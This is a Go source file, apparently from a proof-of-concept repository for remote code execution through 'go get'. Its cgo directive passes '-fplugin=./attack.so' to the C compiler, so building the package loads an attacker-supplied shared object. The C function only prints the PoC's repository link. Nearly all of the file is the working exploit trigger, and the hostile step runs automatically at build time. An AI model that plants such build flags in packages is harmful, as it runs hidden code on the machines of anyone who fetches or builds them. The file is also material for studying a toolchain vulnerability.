package main

/*
#cgo CFLAGS: -fplugin=./attack.so
void echo() {
  printf("link: https://github.com/ticarpiPOC/go-get-rce-poc/");
}
*/
import "C"

func main() {
	C.echo()
	return
}
